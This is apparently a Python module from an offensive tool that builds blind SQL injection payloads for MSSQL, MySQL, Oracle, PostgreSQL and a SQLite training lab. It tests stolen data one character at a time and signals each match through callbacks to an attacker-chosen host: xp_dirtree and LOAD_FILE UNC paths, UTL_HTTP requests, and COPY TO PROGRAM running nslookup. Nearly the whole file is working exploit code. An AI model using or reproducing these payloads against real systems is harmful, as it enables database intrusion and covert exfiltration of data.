from dataclasses import dataclass


@dataclass(frozen=True)
class Profile:
    name: str
    description: str
    comment: str

    def substring(self, expression: str, pos: int) -> str:
        if self.name == "mssql":
            return f"SUBSTRING(({expression}),{pos},1)"
        if self.name == "oracle-http":
            return f"SUBSTR(({expression}),{pos},1)"
        return f"substr(({expression}),{pos},1)"

    def condition(self, expression: str, pos: int, char: str) -> str:
        return f"{self.substring(expression, pos)}='{char}'"

    def payload(self, base: str, condition: str, callback_host: str) -> str:
        if self.name == "sqlite-lab":
            return (
                f"{base}' AND CASE WHEN {condition} "
                f"THEN dns_lookup('{callback_host}') ELSE 0 END--"
            )
        if self.name == "mssql":
            return (
                f"{base}';IF ({condition}) "
                f"EXEC master..xp_dirtree '\\\\{callback_host}\\x'--"
            )
        if self.name == "mysql":
            return (
                f"{base}' AND IF({condition},"
                f"LOAD_FILE('\\\\\\\\{callback_host}\\\\x'),0)-- "
            )
        if self.name == "oracle-http":
            return (
                f"{base}'||(SELECT CASE WHEN {condition} "
                f"THEN UTL_HTTP.REQUEST('http://{callback_host}/') ELSE '' END FROM dual)||'"
            )
        if self.name == "postgres-program":
            escaped = callback_host.replace("'", "'\"'\"'")
            return (
                f"{base}';DO $$ BEGIN IF ({condition}) THEN "
                f"COPY (SELECT '') TO PROGRAM 'nslookup {escaped}'; "
                f"END IF; END $$;--"
            )
        raise ValueError(f"unknown profile: {self.name}")


PROFILES = {
    "sqlite-lab": Profile(
        "sqlite-lab",
        "Training profile for lab/blind_sqli_lab.py using SQLite dns_lookup()",
        "Local lab only.",
    ),
    "mssql": Profile(
        "mssql",
        "MSSQL stacked query using xp_dirtree UNC DNS callbacks",
        "Requires xp_dirtree access and outbound DNS/SMB resolution.",
    ),
    "mysql": Profile(
        "mysql",
        "MySQL LOAD_FILE UNC callback, mostly useful on Windows targets",
        "Requires FILE privilege and Windows-style UNC resolution.",
    ),
    "oracle-http": Profile(
        "oracle-http",
        "Oracle UTL_HTTP callback",
        "Requires UTL_HTTP/network ACL access.",
    ),
    "postgres-program": Profile(
        "postgres-program",
        "PostgreSQL COPY TO PROGRAM callback",
        "Requires stacked queries and high privileges (usually superuser/pg_execute_server_program).",
    ),
}
